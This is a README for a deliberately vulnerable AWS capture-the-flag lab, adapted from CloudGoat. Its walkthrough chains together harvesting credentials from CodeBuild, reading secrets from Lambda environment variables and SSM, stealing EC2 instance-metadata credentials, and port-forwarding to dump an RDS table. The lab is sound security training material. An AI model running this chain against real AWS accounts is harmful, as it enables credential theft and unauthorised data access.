# buildabear

Inspired/modified from the [cloudgoat codebuild_secrets scenario](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/codebuild_secrets)

- bear-whisper gets IAM for cicd from codebuild
- cicd can get SSM parameters, list lambdas, and list EC2 instances
- SSM has SSH keys for EC2 instance
- lambda has RDS credentials as env vars but not connection info
- EC2 instance has role allowing to list dbs and can connect to RDS

## Scenario Resources

1 CodeBuild Project

1 Lambda function

1 VPC with:
  * RDS x 1
  * EC2 x 2

2 IAM Users

## Setup

Run `./keygen.sh` to create an RSA key at `assets/ctf-key`

Create an AWS account and configure credentials for the profile specified by the terraform variable `profile`

Deploy the terraform resources

## Scenario Start(s)

IAM User "bear-whisperer"

## Scenario Goal(s)

A secret string stored in a secure RDS database.

## Walkthrough

Get IAM for cicd

``` shell
export AWS_PROFILE=bear
aws configure

aws codebuild list-projects
aws codebuild batch-get-projects --names <project>

export AWS_PROFILE=cicd
aws configure
```

Get RDS connection info from lambda - this will have credentials, but not the host

``` shell
aws lambda list-functions | jq '.Functions[].Environment.Variables'
```

Get SSH info and connect to the EC2 host, then get its IAM credentials

``` shell
aws ssm describe-parameters
aws ssm get-parameter --name <private key name> | jq '.Parameter.Value' -r > ec2_key
chmod 600 ec2_key
aws ssm get-parameter --name <public key name> | jq '.Parameter.Value' -r > ec2_key.pub
aws ssm get-parameter --name <user name> | jq '.Parameter.Value'
aws ec2 describe-instances | jq '.Reservations[].Instances[].PublicIpAddress' -r

ssh -i ec2_key <username>@<ip>
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

With the new credentials, get the DB address (needs to be done locally since the instance doesn't have the awscli).
Port forward through the EC2 instance to access RDS

``` shell
# aws_session_token must be set in addition to the key and secret
aws rds describe-db-instances --profile stolen-ec2-iam | jq '.DBInstances[].Endpoint.Address' -r
```

Then port forward through  the EC2 instance:

`ssh -i ec2_key <username>@<ip> -L 5432:<rds db host>:5432`

And connect to RDS:

`psql postgresql://secureadmin:<password>@localhost/securedb`

``` sql
\d
select * from sensitive_information;
```
